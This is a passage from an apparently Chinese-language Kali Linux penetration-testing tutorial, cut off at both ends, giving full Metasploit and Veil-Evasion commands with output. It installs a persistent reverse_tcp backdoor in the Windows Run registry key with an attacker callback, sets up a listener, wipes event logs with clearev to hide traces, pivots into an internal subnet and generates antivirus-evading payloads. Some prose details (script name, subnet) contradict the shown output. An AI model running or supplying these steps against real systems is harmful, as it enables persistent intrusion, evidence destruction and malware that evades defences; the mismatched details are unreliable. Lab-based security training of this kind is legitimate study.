-i<opt>-p<opt>-r<opt></opt></opt></opt></p></blockquote><p>该命令支持的选项及含义如下：</p><blockquote><p>-X：当系统启动后，自动启动代理。<br>-i<opt>：设置每个连接尝试的时间间隔，单位为秒。<br>-p<opt>：指定Metasploit监听的端口。<br>-r<opt>：指定反向连接运行Metasploit系统的IP地址，即攻击主机的地址。</opt></opt></opt></p></blockquote><p>使用run persistence命令创建持久后门。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\mimikatz_trunk\mimikatz_trunk\x64&gt;<span class="built_in">exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 8888 -r 192.168.10.75</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/killav.</span><br><span class="line">[!] Example: run post/windows/manage/killav OPTION=value [...]</span><br><span class="line">[*] Killing Antivirus services on the target...</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 8888 -r 192.168.10.75</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try exploit/windows/<span class="built_in">local</span>/persistence.</span><br><span class="line">[!] Example: run exploit/windows/<span class="built_in">local</span>/persistence OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file <span class="keyword">for</span> cleanup created at /root/.msf4/logs/persistence/WIN-FJQ974EQ9HI_20201223.5513/WIN-FJQ974EQ9HI_20201223.5513.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.10.75 LPORT=8888</span><br><span class="line">[*] Persistent agent script is 99646 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Windows\TEMP\VRsLRR.vbs</span><br><span class="line">[*] Executing script C:\Windows\TEMP\VRsLRR.vbs</span><br><span class="line">[+] Agent executed with PID 1860</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ipYGOHFB</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ipYGOHFB</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，在目标主机中创建了一个可执行脚本。其中，该脚本文件名称为KvOgcpAbttfiQ.vbs。此时，用户在目标主机的C:\Windows\TEMP目录中即可看到该文件，如下图所示。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%8715.png" alt="图片15"></p><p>当用户在目标主机创建持久后门后，还需要在本地建立监听。这样，当目标主机重新启动后，即可自动与攻击主机建立连接。</p><p><strong>下面使用exploit/multi/handler模块建立监听。</strong></p><ol><li><p>选择exploit/multi/handler模块。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt;</span><br></pre></td></tr></table></figure></li><li><p>加载攻击载荷，并查看配置选项。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: <span class="string">''</span>, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，必需项LHOST还没有配置。而且，该模块监听的端口为4444。由于前面已经监听了4444端口，所以这里将修改一个其他监听端口，如8888。</p></li><li><p>配置攻击载荷选项。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.10.75</span><br><span class="line">LHOST =&gt; 192.168.10.75</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 8888</span><br><span class="line">LPORT =&gt; 8888</span><br></pre></td></tr></table></figure></li><li><p>建立监听。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.10.75:8888</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，当前主机正在监听端口8888，IP地址为192.168.10.75。</p></li><li><p>当目标主机重新启动后，将主动与攻击主机建立连接。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sf6 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.10.75:8888 </span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.100.246</span><br><span class="line">[*] Meterpreter session 8 opened (192.168.10.75:8888 -&gt; 192.168.100.246:49160) at 2020-12-23 16:51:29 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功打开了一个Meterpreter会话。</p></li></ol><h3 id="5-15-清除踪迹"><a href="#5-15-清除踪迹" class="headerlink" title="5.15 清除踪迹"></a>5.15 清除踪迹</h3><p>当渗透测试者入侵目标主机后，所有的操作都会被记录在目标系统的日志文件中。所以，为了不被目标系统所发现，清除踪迹是非常重要的工作。此时，用户可以使用clearev命令清除踪迹。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev</span><br><span class="line">[*] Wiping 318 records from Application...    <span class="comment">#应用程序记录</span></span><br><span class="line">[*] Wiping 1255 records from System...        <span class="comment">#系统记录</span></span><br><span class="line">[*] Wiping 352 records from Security...       <span class="comment">#安全记录</span></span><br></pre></td></tr></table></figure><p>从输出的信息可以看到清除的相关记录。其中，清除了318条应用程序记录、1255条系统记录和352条安全记录。</p><h3 id="5-16-搭建跳板"><a href="#5-16-搭建跳板" class="headerlink" title="5.16 搭建跳板"></a>5.16 搭建跳板</h3><p>跳板是指利用一台已经攻击的漏洞主机作为跳板，渗透网络中的其他主机。它还可以用于渗透由于路由问题而不能直接访问的内网系统。</p><p>搭建跳板。具体操作步骤如下：</p><ol><li><p>打开获取的Meterpreter会话。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.10.75:8888 </span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.100.11</span><br><span class="line">[*] Meterpreter session 8 opened (192.168.10.75:8888 -&gt; 192.168.100.11:49160) at 2020-12-23 16:51:29 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>从以上会话的地址中，可以看到攻击主机的地址为192.168.10.75，目标主机的地址为192.168.100.11。显然这两台主机不属于同一个网络。所以，如果要对目标主机所在网络中的其他主机进行渗透，则需要添加对应的路由条目才可实现。</p></li><li><p>查看目标系统上的子网。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: 192.168.100.0/255.255.255.0</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>从输出的信息中，可以看到目标系统所在的子网为192.168.100.0/24。</p></li><li><p>将攻击会话放到后台运行，并且添加路由条目。其中，添加路由条目的语法格式如下：</p><blockquote><p>route add [子网] [掩码] [会话ID]</p></blockquote><p>添加路由条目。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 8...</span><br><span class="line">msf6 exploit(handler) &gt; route add 192.168.100.0 255.255.255.0 1</span><br><span class="line">[*] Route added</span><br></pre></td></tr></table></figure><p>从输出的信息中，可以看到成功添加了一条路由条目。此时，用户可以使用route print命令查看添加的路由条目。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(handler) &gt; route <span class="built_in">print</span></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line">   Subnet               Netmask         Gateway</span><br><span class="line">   ------------       --------        ---------------</span><br><span class="line">   192.168.100.0        255.255.255.0      Session 1</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，成功添加了192.168.1.0/24的路由条目。接下来，攻击主机即可对192.168.1.0/24网络中的其他主机实施渗透。提示：在上面的例子中使用route add命令为Meterpreter的攻击会话添加路由。如果要更加自动化地完成这一操作，可以选择使用load auto_add_route命令。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(handler) &gt; load auto_add_route </span><br><span class="line">[*] Successfully loaded plugin: auto_add_route</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功加载了auto_add_route插件。接下来，使用exploit命令即可对其他主机实施渗透测试。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure></li></ol><h2 id="六、免杀Payload攻击"><a href="#六、免杀Payload攻击" class="headerlink" title="六、免杀Payload攻击"></a>六、免杀Payload攻击</h2><p>Kali Linux提供了一款名为Veil Evasion的工具，可以用来生成不同类型的攻击载荷文件。其中，该攻击载荷文件在大多数情况下能绕过常见的杀毒软件。这里介绍使用Veil Evasion工具生成免杀攻击载荷文件，以实现攻击。</p><h3 id="6-1-安装及初始化Veil-Evasion工具"><a href="#6-1-安装及初始化Veil-Evasion工具" class="headerlink" title="6.1 安装及初始化Veil Evasion工具"></a>6.1 安装及初始化Veil Evasion工具</h3><p>Kali Linux默认没有安装Veil Evasion工具。所以，在使用该工具之前需要安装。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># apt install veil-evasion -y</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，如果没有报，就说明Veil Evasion工具安装成功。接下来，就可以启动该工具了。</p><blockquote><p>或者使用克隆安装：<code>git clone https://www.github.com/Veil-Framework/Veil-Evasion.git &amp;&amp; ./Veil-Evasion/setup/setup.sh</code></p></blockquote><p>初始化Veil Evasion工具。具体操作步骤如下：</p><ol><li><p>启动Veil Evasion工具。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># veil                                                               </span></span><br><span class="line"></span><br><span class="line"> =========================================================================</span><br><span class="line">                 Veil (Setup Script) | [Updated]: 2018-05-08</span><br><span class="line"> =========================================================================</span><br><span class="line">     [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework</span><br><span class="line"> =========================================================================</span><br><span class="line"></span><br><span class="line">                 os = kali</span><br><span class="line">          osversion = 2020.4</span><br><span class="line">       osmajversion = 2020</span><br><span class="line">               arch = x86_64</span><br><span class="line">           trueuser = czz</span><br><span class="line">   userprimarygroup = czz</span><br><span class="line">        userhomedir = /home/czz</span><br><span class="line">            rootdir = /usr/share/veil</span><br><span class="line">            veildir = /var/lib/veil</span><br><span class="line">          outputdir = /var/lib/veil/output</span><br><span class="line">    dependenciesdir = /var/lib/veil/setup-dependencies</span><br><span class="line">            winedir = /var/lib/veil/wine</span><br><span class="line">          winedrive = /var/lib/veil/wine/drive_c</span><br><span class="line">            gempath = Z:\var\lib\veil\wine\drive_c\Ruby187\bin\gem</span><br><span class="line"></span><br><span class="line"> [I] Kali Linux 2020.4 x86_64 detected...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> [?] Are you sure you wish to install Veil?</span><br><span class="line"></span><br><span class="line">     Continue with installation? ([y]es/[s]ilent/[N]o):</span><br></pre></td></tr></table></figure><p>以上输出信息显示了当前操作系统的基本信息及Veil Evasion工具的安装位置。这里提示是否继续安装Veil工具，输入y继续安装，安装完成后将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> [*] Initializing package installation</span><br><span class="line"> [*] Pulling down binary dependencies</span><br><span class="line"> [*] Empty folder... git cloning</span><br><span class="line">正克隆到 <span class="string">'/var/lib/veil/setup-dependencies'</span>...</span><br><span class="line">remote: Enumerating objects: 12, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 12 (delta 0), reused 0 (delta 0), pack-reused 12</span><br><span class="line">展开对象中: 100% (12/12), 完成.</span><br><span class="line"> [*] Installing Wine</span><br><span class="line"> [*] Already have x86 architecture added...</span><br><span class="line"> [*] Installing Wine 32-bit and 64-bit binaries (via APT)</span><br><span class="line"> [*] Finished package installation</span><br><span class="line"> [*] Initializing (OS + Wine) Python dependencies installation...</span><br><span class="line"> [*] Installing (Wine) Python...</span><br><span class="line"> [*]  Next -&gt; Next -&gt; Next -&gt; Finished! ...Overwrite <span class="keyword">if</span> prompt (use default </span><br><span class="line">values)</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，正在初始化已安装的包。接下来，在该过程中将会安装一些其他软件，分别是Python、pywin32、pycrypto、Ruby 1.8.7-p371和Autolt。</p></li></ol><h3 id="6-2-生成免杀攻击载荷"><a href="#6-2-生成免杀攻击载荷" class="headerlink" title="6.2 生成免杀攻击载荷"></a>6.2 生成免杀攻击载荷</h3><p>通过配置的设置，Veil工具就可以正常使用了。下面将使用Veil Evasion工具生成免杀攻击载荷文件。</p><p>使用Veil Evasion工具生成免杀攻击载荷文件。具体操作步骤如下：</p><ol><li><p>启动Veil Evasion工具。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># veil </span></span><br><span class="line">================================================================</span><br><span class="line">                             Veil | [Version]: 3.1.11</span><br><span class="line">================================================================</span><br><span class="line">      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework</span><br><span class="line">================================================================</span><br><span class="line">Main Menu              <span class="comment">#主菜单</span></span><br><span class="line">    2 tools loaded</span><br><span class="line">Available Tools:       <span class="comment">#有效的工具</span></span><br><span class="line">    1)        Evasion</span><br><span class="line">    2)        Ordnance</span><br><span class="line">Available Commands:    <span class="comment">#有效的命令</span></span><br><span class="line">    <span class="built_in">exit</span>                        Completely <span class="built_in">exit</span> Veil</span><br><span class="line">    info                        Information on a specific tool</span><br><span class="line">    list                        List available tools</span><br><span class="line">    options                Show Veil configuration</span><br><span class="line">    update                Update Veil</span><br><span class="line">    use                        Use a specific tool</span><br><span class="line">Veil&gt;:</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，命令行提示符为Veil&gt;。由此可以说明，成功进入了Veil工具的交互模式。接下来可以选择工具创建攻击载荷文件。</p></li><li><p>使用Evasion工具。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Veil&gt;: use Evasion</span><br><span class="line">=================================================================</span><br><span class="line">                                   Veil-Evasion</span><br><span class="line">=================================================================</span><br><span class="line">      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework</span><br><span class="line">=================================================================</span><br><span class="line">Veil-Evasion Menu</span><br><span class="line">    41 payloads loaded</span><br><span class="line">Available Commands:</span><br><span class="line">    back                        Go to Veil<span class="string">'s main menu</span></span><br><span class="line"><span class="string">    checkvt                Check VirusTotal.com against generated hashes</span></span><br><span class="line"><span class="string">    clean                Remove generated artifacts</span></span><br><span class="line"><span class="string">    exit                        Completely exit Veil</span></span><br><span class="line"><span class="string">    info                        Information on a specific payload</span></span><br><span class="line"><span class="string">    list                        List available payloads</span></span><br><span class="line"><span class="string">    use                        Use a specific payload</span></span><br><span class="line"><span class="string">Veil/Evasion&gt;:</span></span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，该工具加载了41个攻击载荷。</p></li><li><p>查看Evasion工具支持的攻击载荷，执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Veil/Evasion&gt;: list</span><br><span class="line">===================================================================</span><br><span class="line">                                   Veil-Evasion</span><br><span class="line">===================================================================</span><br><span class="line">      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework</span><br><span class="line">===================================================================</span><br><span class="line"> [*] Available Payloads:</span><br><span class="line">    1)        autoit/shellcode_inject/flat.py</span><br><span class="line">    2)        auxiliary/coldwar_wrapper.py</span><br><span class="line">    3)        auxiliary/macro_converter.py</span><br><span class="line">    4)        auxiliary/pyinstaller_wrapper.py</span><br><span class="line">    5)        c/meterpreter/rev_http.py</span><br><span class="line">    6)        c/meterpreter/rev_http_service.py</span><br><span class="line">    7)        c/meterpreter/rev_tcp.py</span><br><span class="line">    8)        c/meterpreter/rev_tcp_service.py</span><br><span class="line">    9)        cs/meterpreter/rev_http.py</span><br><span class="line">    10)        cs/meterpreter/rev_https.py</span><br><span class="line">    11)        cs/meterpreter/rev_tcp.py</span><br><span class="line">    12)        cs/shellcode_inject/base64.py</span><br><span class="line">    13)        cs/shellcode_inject/virtual.py</span><br><span class="line">    14)        go/meterpreter/rev_http.py</span><br><span class="line">    15)        go/meterpreter/rev_https.py</span><br><span class="line">    16)        go/meterpreter/rev_tcp.py</span><br><span class="line">    17)        go/shellcode_inject/virtual.py</span><br><span class="line">    18)        lua/shellcode_inject/flat.py</span><br><span class="line">    19)        perl/shellcode_inject/flat.py</span><br><span class="line">    20)        powershell/meterpreter/rev_http.py</span><br><span class="line">    21)        powershell/meterpreter/rev_https.py</span><br><span class="line">    22)        powershell/meterpreter/rev_tcp.py</span><br><span class="line">    23)        powershell/shellcode_inject/psexec_virtual.py</span><br><span class="line">    24)        powershell/shellcode_inject/virtual.py</span><br><span class="line">    25)        python/meterpreter/bind_tcp.py</span><br><span class="line">    26)        python/meterpreter/rev_http.py</span><br><span class="line">    27)        python/meterpreter/rev_https.py</span><br><span class="line">    28)        python/meterpreter/rev_tcp.py</span><br><span class="line">    29)        python/shellcode_inject/aes_encrypt.py</span><br><span class="line">    30)        python/shellcode_inject/arc_encrypt.py</span><br><span class="line">    31)        python/shellcode_inject/base64_substitution.py</span><br><span class="line">    32)        python/shellcode_inject/des_encrypt.py</span><br><span class="line">    33)        python/shellcode_inject/flat.py</span><br><span class="line">    34)        python/shellcode_inject/letter_substitution.py</span><br><span class="line">    35)        python/shellcode_inject/pidinject.py</span><br><span class="line">    36)        python/shellcode_inject/stallion.py</span><br><span class="line">    37)        ruby/meterpreter/rev_http.py</span><br><span class="line">    38)        ruby/meterpreter/rev_https.py</span><br><span class="line">    39)        ruby/meterpreter/rev_tcp.py</span><br><span class="line">    40)        ruby/shellcode_inject/base64.py</span><br><span class="line">    41)        ruby/shellcode_inject/flat.py</span><br><span class="line">Veil/Evasion&gt;:</span><br></pre></td></tr></table></figure><p>从输出的信息中，可以看到支持的所有攻击载荷。例如，这里选择使用cs/meterpreter/rev_tcp.py攻击载荷。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Veil/Evasion&gt;: use cs/meterpreter/rev_tcp.py</span><br><span class="line">==================================================================</span><br><span class="line">                                   Veil-Evasion</span><br><span class="line">==================================================================</span><br><span class="line">      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework</span><br><span class="line">==================================================================</span><br><span class="line"> Payload Information:</span><br><span class="line">    Name:                        Pure C<span class="comment"># Reverse TCP Stager</span></span><br><span class="line">    Language:                cs</span><br><span class="line">    Rating:                        Excellent</span><br><span class="line">    Description:            pure windows/meterpreter/reverse_tcp stager, no</span><br><span class="line">                            shellcode</span><br><span class="line">Payload: cs/meterpreter/rev_tcp selected</span><br><span class="line"> Required Options:</span><br><span class="line">Name                    Value           Description</span><br><span class="line">----                    -----           -----------</span><br><span class="line">COMPILE_TO_EXE          Y               Compile to an executable</span><br><span class="line">DEBUGGER                X               Optional: Check <span class="keyword">if</span> debugger is attached</span><br><span class="line">DOMAIN                  X               Optional: Required internal domain</span><br><span class="line">EXPIRE_PAYLOAD          X               Optional: Payloads expire after <span class="string">"Y"</span> days</span><br><span class="line">HOSTNAME                X               Optional: Required system hostname</span><br><span class="line">INJECT_METHOD           Virtual        Virtual or Heap</span><br><span class="line">LHOST                                   IP of the Metasploit handler</span><br><span class="line">LPORT                  4444            Port of the Metasploit handler</span><br><span class="line">PROCESSORS              X               Optional: Minimum number of processors</span><br><span class="line">SLEEP                   X               Optional: Sleep <span class="string">"Y"</span> seconds, check <span class="keyword">if</span> accelerated</span><br><span class="line">TIMEZONE               X               Optional: Check to validate not <span class="keyword">in</span> UTC</span><br><span class="line">USERNAME                X               Optional: The required user account</span><br><span class="line">USE_ARYA                N               Use the Arya crypter</span><br><span class="line"> Available Commands:</span><br><span class="line">    back                Go back to Veil-Evasion</span><br><span class="line">    <span class="built_in">exit</span>                Completely <span class="built_in">exit</span> Veil</span><br><span class="line">    generate            Generate the payload</span><br><span class="line">    options             Show the shellcode<span class="string">'s options</span></span><br><span class="line"><span class="string">    set                 Set shellcode option</span></span><br><span class="line"><span class="string">[cs/meterpreter/rev_tcp&gt;&gt;]:</span></span><br></pre></td></tr></table></figure><p>以上输出信息显示了攻击载荷的可配置选项。从以上信息中可以看到没有配置LHOST选项。</p></li><li><p>配置LHOST选项，并查看所有配置信息。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;]: <span class="built_in">set</span> LHOST 192.168.10.75</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;]: options </span><br><span class="line">Payload: cs/meterpreter/rev_tcp selected</span><br><span class="line"> Required Options:</span><br><span class="line">Name                    Value                           Description</span><br><span class="line">----                    -----                           -----------</span><br><span class="line">COMPILE_TO_EXE          Y                               Compile to an executable</span><br><span class="line">DEBUGGER                X                               Optional: Check <span class="keyword">if</span> debugger is attached</span><br><span class="line">DOMAIN                  X                               Optional: Required internal domain</span><br><span class="line">EXPIRE_PAYLOAD          X                               Optional: Payloads expire after <span class="string">"Y"</span> days</span><br><span class="line">HOSTNAME                X                               Optional: Required system hostname</span><br><span class="line">INJECT_METHOD           Virtual                         Virtual or Heap</span><br><span class="line">LHOST                   192.168.10.75                   IP of the Metasploit handler</span><br><span class="line">LPORT                   4444                            Port of the Metasploit handler</span><br><span class="line">PROCESSORS              X                               Optional: Minimum number of processors</span><br><span class="line">SLEEP                   X                               Optional: Sleep <span 